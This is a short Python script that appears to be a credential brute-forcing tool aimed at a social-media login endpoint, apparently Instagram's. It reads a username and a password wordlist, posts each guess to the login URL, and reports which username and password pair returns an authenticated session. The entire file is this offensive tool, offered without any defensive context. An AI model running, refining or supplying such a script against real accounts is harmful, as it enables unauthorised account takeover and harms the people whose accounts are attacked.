import requests
import time


session = requests.Session()
user = input("Enter Username: ")
passwd = input("Password file: ")
file = open(f"{passwd}", "r")

def brooter():
	while True:
		passwd = file.readline().split('\n')[0]
  
		url = input('Enter a url: ')
		
		headers = {
			'user-agent': '',
			'x-csrftoken': '',
		}
		
		timer = str(time.time()).split(".")[1]
		
		data = {
			'username': f'{user}',
			'enc_passwd': f'{timer}:{passwd}',
			'queryParams': {},
			'optIntoOneTap': 'false'
		}
		
		req = session.post(url, headers=headers, data=data).text
		
		if ('"authenticated":true') in req:
			print(f"Success: user:{user} pass:{passwd}")
			input("")
			
		elif '"checkpoint_url"' in req:
			print("error")
			
		else:
			print(f"Unsuccessful Attempt: user:{user} pass:{passwd}")
			
		time.sleep(1)
		
brooter()
